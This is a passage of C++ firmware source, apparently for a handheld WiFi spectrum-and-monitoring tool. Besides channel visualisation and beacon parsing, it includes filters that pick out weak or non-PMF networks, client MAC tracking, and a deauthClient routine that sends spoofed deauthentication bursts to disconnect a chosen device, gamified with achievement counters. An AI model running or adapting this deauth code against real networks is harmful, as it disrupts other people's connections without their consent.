    int centerX = canvas.width() / 2;
    
    // Line 1: Full MAC address
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        client.mac[0], client.mac[1], client.mac[2],
        client.mac[3], client.mac[4], client.mac[5]);
    canvas.drawString(macStr, centerX, boxY + 6);
    
    // Line 2: Vendor name (uppercase, truncated if needed)
    const char* vendorRaw = client.vendor ? client.vendor : "Unknown";
    char vendorUpper[25];
    strncpy(vendorUpper, vendorRaw, 24);
    vendorUpper[24] = '\0';
    for (int i = 0; vendorUpper[i]; i++) vendorUpper[i] = toupper(vendorUpper[i]);
    canvas.drawString(vendorUpper, centerX, boxY + 20);
    
    // Line 3: RSSI and age
    uint32_t age = (millis() - client.lastSeen) / 1000;
    char statsStr[28];
    snprintf(statsStr, sizeof(statsStr), "RSSI: %ddB  AGE: %luS", client.rssi, age);
    canvas.drawString(statsStr, centerX, boxY + 38);
    
    // Line 4: Position relative to AP
    int delta = client.rssi - net.rssi;
    const char* position;
    if (delta > 10) position = "CLOSER TO YOU THAN AP";
    else if (delta > 3) position = "SLIGHTLY CLOSER";
    else if (delta < -10) position = "FAR FROM YOU";
    else if (delta < -3) position = "SLIGHTLY FARTHER";
    else position = "SAME DISTANCE AS AP";
    canvas.drawString(position, centerX, boxY + 52);
    
    // Line 5: Dismiss hint
    canvas.drawString("[ANY KEY] CLOSE", centerX, boxY + 64);
    
    // Reset datum
    canvas.setTextDatum(top_left);
}

void SpectrumMode::drawSpectrum(M5Canvas& canvas) {
    // Guard against callback modifying networks during snapshot
    busy = true;
    
    // Copy pointers to avoid heap allocations in render loop
    const size_t maxCount = networks.size();
    const size_t cap = (maxCount > MAX_SPECTRUM_NETWORKS) ? MAX_SPECTRUM_NETWORKS : maxCount;
    const SpectrumNetwork* snapshot[MAX_SPECTRUM_NETWORKS];
    size_t snapshotCount = 0;
    for (size_t i = 0; i < cap; i++) {
        snapshot[snapshotCount++] = &networks[i];
    }
    
    busy = false;
    
    // Sort pointers by RSSI (weakest first, so strongest draws on top)
    std::sort(snapshot, snapshot + snapshotCount, [](const SpectrumNetwork* a, const SpectrumNetwork* b) {
        return a->rssi < b->rssi;
    });
    
    // Draw each network's Gaussian lobe (only if matches filter)
    for (size_t i = 0; i < snapshotCount; i++) {
        const auto& net = *snapshot[i];
        
        // Skip networks that don't match current filter
        if (!matchesFilter(net)) continue;
        
        // Use smoothed display frequency to prevent left/right jitter
        float freq = net.displayFreqMHz;
        
        // Check if selected (compare by BSSID)
        bool isSelected = false;
        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
            isSelected = (memcmp(net.bssid, networks[selectedIndex].bssid, 6) == 0);
        }
        
        drawGaussianLobe(canvas, freq, net.rssi, isSelected);
    }
}

void SpectrumMode::drawGaussianLobe(M5Canvas& canvas, float centerFreqMHz, 
                                     int8_t rssi, bool filled) {
    // 2.4GHz WiFi channels are 22MHz wide
    // Uses pre-computed GAUSSIAN_LUT[] to avoid expensive expf() calls
    // LUT index 0-30 maps to distance -15 to +15 MHz
    
    int peakY = rssiToY(rssi);
    int baseY = SPECTRUM_BOTTOM;
    
    // Don't draw if peak is below baseline
    if (peakY >= baseY) return;
    
    // Draw lobe from center-15MHz to center+15MHz
    int prevX = -1;
    int prevY = baseY;
    
    for (float freq = centerFreqMHz - 15; freq <= centerFreqMHz + 15; freq += 0.5f) {
        int x = freqToX(freq);
        
        // Skip if outside visible area
        if (x < SPECTRUM_LEFT || x > SPECTRUM_RIGHT) {
            prevX = x;
            prevY = baseY;
            continue;
        }
        
        // Gaussian amplitude from LUT with linear interpolation
        // LUT maps integer distances -15 to +15 (indices 0-30)
        float dist = freq - centerFreqMHz;
        float lutPos = dist + 15.0f;  // Map -15..+15 to 0..30
        float amplitude;
        if (lutPos < 0.0f || lutPos > 30.0f) {
            amplitude = 0.0f;
        } else {
            int lutIdx = (int)lutPos;
            float frac = lutPos - lutIdx;
            if (lutIdx >= 30) {
                amplitude = GAUSSIAN_LUT[30];
            } else {
                // Linear interpolation between adjacent LUT entries
                amplitude = GAUSSIAN_LUT[lutIdx] + frac * (GAUSSIAN_LUT[lutIdx + 1] - GAUSSIAN_LUT[lutIdx]);
            }
        }
        int y = baseY - (int)((baseY - peakY) * amplitude);
        
        if (prevX >= SPECTRUM_LEFT && prevX <= SPECTRUM_RIGHT) {
            if (filled) {
                // Filled lobe - draw vertical line from baseline to curve
                if (y < baseY) {
                    canvas.drawFastVLine(x, y, baseY - y, COLOR_FG);
                }
            } else {
                // Outline only - connect points
                canvas.drawLine(prevX, prevY, x, y, COLOR_FG);
            }
        }
        
        prevX = x;
        prevY = y;
    }
}

int SpectrumMode::freqToX(float freqMHz) {
    float leftFreq = viewCenterMHz - viewWidthMHz / 2;
    int width = SPECTRUM_RIGHT - SPECTRUM_LEFT;
    return SPECTRUM_LEFT + (int)((freqMHz - leftFreq) * width / viewWidthMHz);
}

int SpectrumMode::rssiToY(int8_t rssi) {
    // Clamp to range
    if (rssi < RSSI_MIN) rssi = RSSI_MIN;
    if (rssi > RSSI_MAX) rssi = RSSI_MAX;
    
    // Map RSSI to Y (inverted - stronger = higher on screen = lower Y)
    int height = SPECTRUM_BOTTOM - SPECTRUM_TOP;
    return SPECTRUM_BOTTOM - (int)(((float)(rssi - RSSI_MIN) / (RSSI_MAX - RSSI_MIN)) * height);
}

float SpectrumMode::channelToFreq(uint8_t channel) {
    // 2.4GHz band: Ch1=2412MHz, 5MHz spacing, Ch13=2472MHz
    if (channel < 1) channel = 1;
    if (channel > 13) channel = 13;
    return 2412.0f + (channel - 1) * 5.0f;
}

// ============================================================
// DIAL MODE: TILT-TO-TUNE CHANNEL SELECTION
// When device goes UPRIGHT (UPS), dial mode activates automatically
// Accelerometer tilt left/right selects channel with smooth sliding indicator
// ============================================================

void SpectrumMode::updateDialChannel() {
    // Skip if not Cardputer ADV (no accelerometer on regular Cardputer)
    if (M5.getBoard() != m5::board_t::board_M5CardputerADV) return;
    
    // Skip if in client monitor mode
    if (monitoringNetwork) return;
    
    uint32_t now = millis();
    
    // ==[ PPS UPDATE ]== once per second
    if (now - lastPpsUpdate >= 1000) {
        displayPps = ppsCounter;
        ppsCounter = 0;
        lastPpsUpdate = now;
    }
    
    // ==[ READ IMU ]== accelerometer
    float ax, ay, az;
    M5.Imu.getAccel(&ax, &ay, &az);
    
    // ==[ AUTO FLT/UPS MODE SWITCH WITH HYSTERESIS ]==
    // FLT (flat): normal spectrum mode, auto-hopping
    // UPS (upright): dial mode activates, accelerometer controls channel
    // Hysteresis prevents flickering at boundary:
    //   Enter UPS when |az| < 0.5 (clearly upright)
    //   Exit UPS when |az| > 0.7 (clearly flat)
    //   Between 0.5-0.7: maintain previous state
    float absAz = fabsf(az);
    
    bool deviceFlat;
    if (dialWasUpright) {
        // Currently upright - need strong flat signal to exit
        deviceFlat = absAz > 0.7f;
    } else {
        // Currently flat - need strong upright signal to enter
        deviceFlat = absAz > 0.5f;
    }
    dialWasUpright = !deviceFlat;
    
    if (deviceFlat) {
        // Device flat - disable dial mode, return to normal hopping
        // But only after 200ms debounce to prevent flicker
        if (dialMode && (now - dialModeEntryTime >= 200)) {
            dialMode = false;
            // Don't change channel - let normal hopping resume
        }
        return;  // No dial update when flat
    } else {
        // Device upright - enable dial mode
        if (!dialMode) {
            dialMode = true;
            dialModeEntryTime = now;
            lastDialUpdate = now;  // Reset timing to avoid dt jump
            // Initialize smooth position to current channel
            dialPositionSmooth = (float)currentChannel;
            dialPositionTarget = dialPositionSmooth;
            dialChannel = currentChannel;
        }
    }
    
    // ==[ DIAL LOCKED ]== skip gyro reading but keep channel
    if (dialLocked) {
        // Keep channel locked
        if (currentChannel != dialChannel) {
            esp_wifi_set_channel(dialChannel, WIFI_SECOND_CHAN_NONE);
            currentChannel = dialChannel;
        }
        return;
    }
    
    // ==[ LANDSCAPE UPRIGHT JOG CONTROL ]==
    // JOG WHEEL behavior - tilt to scroll channels, level to stop.
    // Ported from Sirloin for satisfying feel.
    
    const float DEADZONE = 0.05f;      // tiny deadzone - just noise rejection
    const float SCROLL_SPEED = 25.0f;  // FAST: full sweep in ~0.5s at max tilt
    
    // Use -ax for left/right tilt in landscape upright orientation
    // Tilt right (right edge down) → ax positive → -ax negative → BUT we want higher channels
    // So invert: tilt right = positive scroll = higher channels
    float tilt = -ax;
    
    // Apply deadzone
    if (fabsf(tilt) < DEADZONE) {
        tilt = 0.0f;
    } else {
        // Remove deadzone from value, preserve sign
        tilt = (tilt > 0) ? (tilt - DEADZONE) : (tilt + DEADZONE);
    }
    
    // Clamp to ±1 range (values beyond ±1g are extreme)
    tilt = constrain(tilt, -1.0f, 1.0f);
    
    // Calculate time delta
    float dt = (now - lastDialUpdate) / 1000.0f;
    if (dt > 0.1f) dt = 0.1f;  // cap to avoid jumps after pause
    if (dt < 0.001f) dt = 0.016f;  // minimum ~60fps equivalent
    
    // Apply scroll: tilt controls velocity (jog wheel style)
    // Positive tilt → higher channels, Negative tilt → lower channels
    dialPositionTarget += tilt * SCROLL_SPEED * dt;
    dialPositionTarget = constrain(dialPositionTarget, 1.0f, 13.0f);
    
    // ==[ SMOOTH INTERPOLATION ]== faster lerp for responsiveness
    dialPositionSmooth += (dialPositionTarget - dialPositionSmooth) * 0.3f;
    
    // ==[ CHANNEL FROM SMOOTH POSITION ]== rounded integer
    int newChannel = (int)roundf(dialPositionSmooth);
    newChannel = constrain(newChannel, 1, 13);  // WiFi channels 1-13 only
    
    // ==[ UPDATE CHANNEL IF CHANGED ]==
    if (newChannel != dialChannel) {
        dialChannel = newChannel;
        esp_wifi_set_channel(dialChannel, WIFI_SECOND_CHAN_NONE);
        currentChannel = dialChannel;
        SFX::play(SFX::CLICK);  // tick sound on channel change
        
        // Scroll spectrum view to keep dial channel centered
        viewCenterMHz = channelToFreq(dialChannel);
    }
    // Note: Redundant channel enforcement removed - above block already ensures
    // currentChannel == dialChannel after any change
    
    lastDialUpdate = now;
}

void SpectrumMode::pruneStale() {
    // Guard against callback modifying networks during prune
    busy = true;
    
    uint32_t now = millis();
    
    // Save BSSID of selected network before pruning
    uint8_t selectedBSSID[6] = {0};
    bool hadSelection = (selectedIndex >= 0 && selectedIndex < (int)networks.size());
    if (hadSelection) {
        memcpy(selectedBSSID, networks[selectedIndex].bssid, 6);
    }
    
    // Remove networks not seen recently
    networks.erase(
        std::remove_if(networks.begin(), networks.end(), 
            [now](const SpectrumNetwork& n) {
                return (now - n.lastSeen) > STALE_TIMEOUT_MS;
            }),
        networks.end()
    );
    
    // Restore selection by finding BSSID in new vector
    if (hadSelection) {
        selectedIndex = -1;  // Assume lost
        for (size_t i = 0; i < networks.size(); i++) {
            if (memcmp(networks[i].bssid, selectedBSSID, 6) == 0) {
                selectedIndex = (int)i;
                break;
            }
        }
    } else if (selectedIndex >= (int)networks.size()) {
        // No prior selection, just bounds-check
        selectedIndex = networks.empty() ? -1 : 0;
    }
    
    busy = false;
}

void SpectrumMode::onBeacon(const uint8_t* bssid, uint8_t channel, int8_t rssi, const char* ssid, wifi_auth_mode_t authmode, bool hasPMF, bool isProbeResponse) {
    // Skip if main thread is accessing networks
    if (busy) return;
    
    // Validate inputs to prevent crashes
    if (!bssid || channel < 1 || channel > 13) return;
    
    bool hasSSID = (ssid && ssid[0] != 0);
    
    // [BUG3 FIX] Look for existing network - use index-based loop with size snapshot
    // This avoids iterator invalidation if vector is modified between iterations
    size_t count = networks.size();
    for (size_t i = 0; i < count; i++) {
        // Re-check busy each iteration in case main thread started work
        if (busy) return;
        
        // Bounds check in case vector shrunk
        if (i >= networks.size()) break;
        
        SpectrumNetwork& net = networks[i];
        if (memcmp(net.bssid, bssid, 6) == 0) {
            // Update existing - these are atomic writes, safe without lock
            net.rssi = rssi;
            net.lastSeen = millis();
            net.authmode = authmode;  // Update auth mode
            net.hasPMF = hasPMF;      // Update PMF status
            net.channel = channel;    // Update channel in case it changed
            
            // Smooth the display frequency with EMA to prevent left/right jitter
            // Alpha=0.15 balances responsiveness with stability
            float targetFreq = channelToFreq(channel);
            net.displayFreqMHz += (targetFreq - net.displayFreqMHz) * 0.15f;
            
            // Probe response can reveal hidden SSID
            if (hasSSID && net.isHidden && net.ssid[0] == 0) {
                strncpy(net.ssid, ssid, 32);
                net.ssid[32] = 0;
                net.wasRevealed = true;
                // Defer logging to main thread (avoid Serial in WiFi callback)
                if (!pendingReveal) {
                    strncpy(pendingRevealSSID, ssid, 32);
                    pendingRevealSSID[32] = 0;
                    pendingRevealSSID[33] = 0; // Extra safety null terminator
                    pendingReveal = true;
                }
            }
            // Also update if we had no SSID before
            else if (hasSSID && strlen(net.ssid) == 0) {
                strncpy(net.ssid, ssid, 32);
                net.ssid[32] = 0;
            }
            return;
        }
    }
    
    // Add new network (limit to prevent OOM)
    if (networks.size() >= MAX_SPECTRUM_NETWORKS) return;
    
    SpectrumNetwork net = {};
    memcpy(net.bssid, bssid, 6);
    if (hasSSID && ssid != nullptr) {
        strncpy(net.ssid, ssid, 32);
        net.ssid[32] = 0;
        net.isHidden = false;
    } else {
        // Empty SSID = hidden network
        net.isHidden = true;
        net.ssid[0] = 0; // Ensure empty string
    }
    net.channel = channel;
    net.rssi = rssi;
    net.lastSeen = millis();
    net.authmode = authmode;
    net.hasPMF = hasPMF;
    net.wasRevealed = false;
    net.displayFreqMHz = channelToFreq(channel);  // Initialize smoothed position
    net.clientCount = 0; // Initialize client count
    
    // Initialize client array to zero
    memset(net.clients, 0, sizeof(net.clients));
    
    // Defer push_back to main loop (ESP32 dual-core race: callback can run concurrent with update())
    // If pendingNetworkAdd already set, we lose one add - acceptable tradeoff for safety
    if (!pendingNetworkAdd) {
        pendingNetwork = net;
        pendingNetworkAdd = true;
        // Defer XP to main loop (onBeacon runs in WiFi callback - can't call Display::showLevelUp)
        if (pendingNetworkXP < 255) pendingNetworkXP++;
    }
}

void SpectrumMode::getSelectedInfo(char* out, size_t len) {
    if (!out || len == 0) return;
    // Guard against callback race
    if (busy) {
        snprintf(out, len, "SCANNING...");
        return;
    }
    
    // [P8] Client monitoring mode - show client count and channel (SSID in header)
    if (monitoringNetwork) {
        if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
            const auto& net = networks[monitoredNetworkIndex];
            // SSID already shown in header - no duplication needed
            snprintf(out, len, "MON C:%02d CH:%02d", net.clientCount, net.channel);
            return;
        }
        snprintf(out, len, "MONITORING...");
        return;
    }
    
    if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
        const auto& net = networks[selectedIndex];
        
        // Bottom bar: ~33 chars available (240px - margins - uptime)
        // Fixed part: " -XXdB CH:XX YYYY" = ~16 chars worst case
        // SSID gets max 15 chars + ".." if truncated
        const size_t MAX_SSID_DISPLAY = 15;
        
        char ssidBuf[32];
        if (net.ssid[0]) {
            if (net.wasRevealed) {
                snprintf(ssidBuf, sizeof(ssidBuf), "*%s", net.ssid);
            } else {
                strncpy(ssidBuf, net.ssid, sizeof(ssidBuf) - 1);
                ssidBuf[sizeof(ssidBuf) - 1] = '\0';
            }
        } else {
            strncpy(ssidBuf, "[HIDDEN]", sizeof(ssidBuf) - 1);
            ssidBuf[sizeof(ssidBuf) - 1] = '\0';
        }
        for (size_t i = 0; ssidBuf[i]; i++) {
            ssidBuf[i] = (char)toupper((unsigned char)ssidBuf[i]);
        }
        size_t ssidLen = strlen(ssidBuf);
        if (ssidLen > MAX_SSID_DISPLAY) {
            if (MAX_SSID_DISPLAY >= 2) {
                ssidBuf[MAX_SSID_DISPLAY] = '\0';
                ssidBuf[MAX_SSID_DISPLAY - 2] = '.';
                ssidBuf[MAX_SSID_DISPLAY - 1] = '.';
            } else if (MAX_SSID_DISPLAY > 0) {
                ssidBuf[MAX_SSID_DISPLAY] = '\0';
            }
        }
        
        snprintf(out, len, "%s %ddB CH:%02d %s",
                 ssidBuf,
                 net.rssi, net.channel,
                 authModeToShortString(net.authmode));
        return;
    }
    if (networks.empty()) {
        snprintf(out, len, "SCANNING...");
        return;
    }
    snprintf(out, len, "PRESS ENTER TO SELECT");
}

// Packet callback - extract beacon info for visualization
void SpectrumMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    if (busy) return;  // [P1] Main thread is iterating
    
    // Count all packets for PPS display in dial mode
    ppsCounter++;
    
    if (!pkt || !pkt->payload) return;
    
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t channel = pkt->rx_ctrl.channel;
    
    // Validate channel range
    if (channel < 1 || channel > 13) return;
    
    // Handle data frames when monitoring
    if (type == WIFI_PKT_DATA && monitoringNetwork) {
        processDataFrame(payload, len, rssi);
        return;
    }
    
    if (type != WIFI_PKT_MGMT) return;
    
    if (len < 36) return;
    
    // Check frame type - beacon (0x80) or probe response (0x50)
    uint8_t frameType = payload[0];
    if (frameType != 0x80 && frameType != 0x50) return;
    
    bool isProbeResponse = (frameType == 0x50);
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    // Parse SSID from tagged parameters (starts at offset 36)
    char ssid[33] = {0};
    uint16_t offset = 36;
    
    while (offset + 2 < len) {
        if (offset + 2 >= len) break; // Additional bounds check
        uint8_t tagNum = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tagNum == 0 && tagLen <= 32) {  // SSID tag
            if (offset + 2 + tagLen >= len) break; // Bounds check before memcpy
            memcpy(ssid, payload + offset + 2, tagLen);
            ssid[tagLen] = 0;
            break;
        }
        
        offset += 2 + tagLen;
    }
    
    // Parse auth mode from RSN (0x30) and WPA (0xDD) IEs
    wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;  // Default to open
    bool hasRSN = false;
    offset = 36;
    while (offset + 2 < len) {
        if (offset + 2 >= len) break; // Additional bounds check
        uint8_t tagNum = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tagNum == 0x30 && tagLen >= 2) {  // RSN IE = WPA2/WPA3
            hasRSN = true;
            authmode = WIFI_AUTH_WPA2_PSK;
        } else if (tagNum == 0xDD && tagLen >= 8) {  // Vendor specific
            // Check for WPA1 OUI: 00:50:F2:01
            if (offset + 5 < len &&  // Ensure we don't read past buffer
                payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
                payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
                // WPA1 - only set if not already WPA2
                if (!hasRSN) {
                    authmode = WIFI_AUTH_WPA_PSK;
                } else {
                    authmode = WIFI_AUTH_WPA_WPA2_PSK;
                }
            }
        }
        
        offset += 2 + tagLen;
    }
    
    // Detect PMF (Protected Management Frames)
    bool hasPMF = detectPMF(payload, len);
    
    // If PMF is required and we have RSN, it's WPA3 (or WPA2/3 transitional)
    if (hasPMF && authmode == WIFI_AUTH_WPA2_PSK) {
        authmode = WIFI_AUTH_WPA3_PSK;
    }
    
    // Update spectrum data
    onBeacon(bssid, channel, rssi, ssid, authmode, hasPMF, isProbeResponse);
}

// Check if auth mode is considered vulnerable (OPEN, WEP, WPA1)
bool SpectrumMode::isVulnerable(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:
        case WIFI_AUTH_WEP:
        case WIFI_AUTH_WPA_PSK:
            return true;
        default:
            return false;
    }
}

// Check if network passes current filter
bool SpectrumMode::matchesFilter(const SpectrumNetwork& net) {
    switch (filter) {
        case SpectrumFilter::VULN:
            return isVulnerable(net.authmode);
        case SpectrumFilter::SOFT:
            return !net.hasPMF;
        case SpectrumFilter::HIDDEN:
            return net.isHidden;
        case SpectrumFilter::ALL:
        default:
            return true;
    }
}

// Convert auth mode to short display string
const char* SpectrumMode::authModeToShortString(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI";
        default: return "?";
    }
}

// Detect PMF (Protected Management Frames) from RSN IE
// Networks with PMF required (MFPR=1) are immune to deauth attacks
bool SpectrumMode::detectPMF(const uint8_t* payload, uint16_t len) {
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

// Process data frame to extract client MAC
void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (!payload || len < 24) return;  // Too short for valid data frame or null payload
    
    // Frame Control is 2 bytes - ToDS/FromDS are in byte 1, not byte 0
    // Byte 0: Protocol(2) + Type(2) + Subtype(4)
    // Byte 1: ToDS(1) + FromDS(1) + MoreFrag + Retry + PwrMgmt + MoreData + Protected + Order
    uint8_t flags = payload[1];
    uint8_t toDS = (flags & 0x01);
    uint8_t fromDS = (flags & 0x02) >> 1;
    
    uint8_t bssid[6];
    uint8_t clientMac[6];
    
    if (toDS && !fromDS) {
        // Client -> AP: addr1=BSSID, addr2=client
        if (len < 16) return; // Check if payload is long enough for addr2
        memcpy(bssid, payload + 4, 6);
        memcpy(clientMac, payload + 10, 6);
    } else if (!toDS && fromDS) {
        // AP -> Client: addr1=client, addr2=BSSID
        if (len < 16) return; // Check if payload is long enough for addr2
        memcpy(clientMac, payload + 4, 6);
        memcpy(bssid, payload + 10, 6);
    } else {
        return;  // WDS or IBSS, ignore
    }
    
    // [P2] Verify BSSID matches monitored network
    if (!macEqual(bssid, monitoredBSSID)) return;
    
    // Skip broadcast/multicast clients
    if (clientMac[0] & 0x01) return;
    
    trackClient(bssid, clientMac, rssi);
}

// Track client connected to monitored network
void SpectrumMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    // Skip if main thread is busy (race prevention)
    if (busy || !bssid || !clientMac) return;
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || monitoredNetworkIndex >= (int)networks.size()) {
        // Don't call exitClientMonitor from callback - just skip
        return;
    }
    
    SpectrumNetwork& net = networks[monitoredNetworkIndex];
    
    // Double-check BSSID still matches [P2]
    if (!macEqual(net.bssid, monitoredBSSID)) {
        // Don't call exitClientMonitor from callback - just skip
        return;
    }
    
    uint32_t now = millis();
    
    // Check if client already tracked
    for (int i = 0; i < net.clientCount; i++) {
        if (macEqual(net.clients[i].mac, clientMac)) {
            net.clients[i].rssi = rssi;
            net.clients[i].lastSeen = now;
            return;  // Updated existing
        }
    }
    
    // Add new client if room
    if (net.clientCount < MAX_SPECTRUM_CLIENTS) {
        SpectrumClient& newClient = net.clients[net.clientCount];
        memcpy(newClient.mac, clientMac, 6);
        newClient.rssi = rssi;
        newClient.lastSeen = now;
        newClient.vendor = OUI::getVendor(clientMac);  // Cache once
        net.clientCount++;
        
        // Request beep for first few clients (avoid spamming)
        if (clientsDiscoveredThisSession < CLIENT_BEEP_LIMIT) {
            clientsDiscoveredThisSession++;
            pendingClientBeep = true;
        }
        
        Serial.printf("[SPECTRUM] New client: %02X:%02X:%02X:%02X\n",
            clientMac[0], clientMac[1], clientMac[2],
            clientMac[3], clientMac[4], clientMac[5]);
    }
}

// Enter client monitoring mode for selected network [P5]
void SpectrumMode::enterClientMonitor() {
    busy = true;  // [P5] Block callback FIRST
    
    // Bounds check [P3]
    if (selectedIndex < 0 || selectedIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    
    SpectrumNetwork& net = networks[selectedIndex];
    
    // Store BSSID separately [P2]
    memcpy(monitoredBSSID, net.bssid, 6);
    monitoredNetworkIndex = selectedIndex;
    monitoredChannel = net.channel;
    
    // Clear any old client data [P6]
    net.clientCount = 0;
    
    // Reset UI state
    clientScrollOffset = 0;
    selectedClientIndex = 0;
    lastClientPrune = millis();
    clientsDiscoveredThisSession = 0;  // Reset beep counter
    pendingClientBeep = false;         // Clear any pending beep
    
    // Reset achievement tracking (v0.1.6)
    clientMonitorEntryTime = millis();
    deauthsThisMonitor = 0;
    firstDeauthTime = 0;
    
    // Lock channel
    esp_wifi_set_channel(monitoredChannel, WIFI_SECOND_CHAN_NONE);
    
    // Short beep for channel lock - non-blocking
    SFX::play(SFX::CHANNEL_LOCK);
    
    Serial.printf("[SPECTRUM] Monitoring %s on CH%d\n", 
        net.ssid[0] ? net.ssid : "<hidden>", monitoredChannel);
    
    // NOW enable monitoring (after all state is ready) [P5]
    monitoringNetwork = true;
    
    busy = false;
}

// Exit client monitoring mode [P4] [P5]
void SpectrumMode::exitClientMonitor() {
    busy = true;  // [P5] Block callback FIRST
    
    monitoringNetwork = false;  // [P4] Disable monitoring immediately
    
    // Clear client data to free memory [P6]
    if (monitoredNetworkIndex >= 0 && 
        monitoredNetworkIndex < (int)networks.size()) {
        networks[monitoredNetworkIndex].clientCount = 0;
    }
    
    // Reset indices
    monitoredNetworkIndex = -1;
    memset(monitoredBSSID, 0, 6);
    
    // Reset popup state
    clientDetailActive = false;
    
    Serial.println("[SPECTRUM] Exited client monitor");
    
    busy = false;
    
    // Channel hopping resumes automatically in next update()
}

// Prune stale clients [P1] [P3] [P10]
void SpectrumMode::pruneStaleClients() {
    busy = true;  // [P1] Block callback
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    
    SpectrumNetwork& net = networks[monitoredNetworkIndex];
    uint32_t now = millis();
    
    // [P10] Iterate BACKWARDS to handle removal safely
    for (int i = net.clientCount - 1; i >= 0; i--) {
        if ((now - net.clients[i].lastSeen) > CLIENT_STALE_TIMEOUT_MS) {
            // Remove this client by shifting array
            for (int j = i; j < net.clientCount - 1; j++) {
                net.clients[j] = net.clients[j + 1];
            }
            net.clientCount--;
        }
    }
    
    // [P3] Fix selectedClientIndex if now out of bounds
    if (net.clientCount == 0) {
        selectedClientIndex = 0;
        clientScrollOffset = 0;
    } else if (selectedClientIndex >= net.clientCount) {
        selectedClientIndex = net.clientCount - 1;
    }
    
    // Fix scroll offset if needed
    if (clientScrollOffset > 0 && 
        clientScrollOffset >= net.clientCount) {
        int maxOffset = net.clientCount - VISIBLE_CLIENTS;
        clientScrollOffset = maxOffset > 0 ? maxOffset : 0;
    }
    
    busy = false;
}

// Get monitored network SSID [P3] [P15]
String SpectrumMode::getMonitoredSSID() {
    if (!monitoringNetwork) return "";
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) return "";
    
    const char* ssid = networks[monitoredNetworkIndex].ssid;
    if (ssid[0] == 0) return "<HIDDEN>";  // [P15]
    
    // Truncate for bottom bar [P9]
    char truncated[12];
    strncpy(truncated, ssid, 11);
    truncated[11] = '\0';
    return String(truncated);
}

// Get client count for monitored network [P3]
int SpectrumMode::getClientCount() {
    if (!monitoringNetwork) return 0;
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) return 0;
    return networks[monitoredNetworkIndex].clientCount;
}

// Show client detail popup [P3] [P9]
void SpectrumMode::deauthClient(int idx) {
    // Block callback during deauth sequence (has delays)
    busy = true;
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    if (idx < 0 || idx >= networks[monitoredNetworkIndex].clientCount) {
        busy = false;
        return;
    }
    
    const SpectrumNetwork& net = networks[monitoredNetworkIndex];
    const SpectrumClient& client = net.clients[idx];
    
    // Send deauth burst (5 frames with jitter)
    int sent = 0;
    for (int i = 0; i < 5; i++) {
        // Forward: AP -> Client
        if (WSLBypasser::sendDeauthFrame(net.bssid, net.channel, client.mac, 7)) {
            sent++;
        }
        delay(random(1, 6));  // 1-5ms jitter
        
        // Reverse: Client -> AP (spoofed)
        WSLBypasser::sendDeauthFrame(client.mac, net.channel, net.bssid, 8);
        delay(random(1, 6));
    }
    
    // Feedback beep (low thump) - non-blocking
    SFX::play(SFX::DEAUTH);
    
    // Short toast with client MAC suffix
    char msg[24];
    snprintf(msg, sizeof(msg), "DEAUTH %02X:%02X x%d",
        client.mac[4], client.mac[5], sent);
    Display::showToast(msg);
    delay(300);  // Brief feedback
    
    // === ACHIEVEMENT CHECKS (v0.1.6) ===
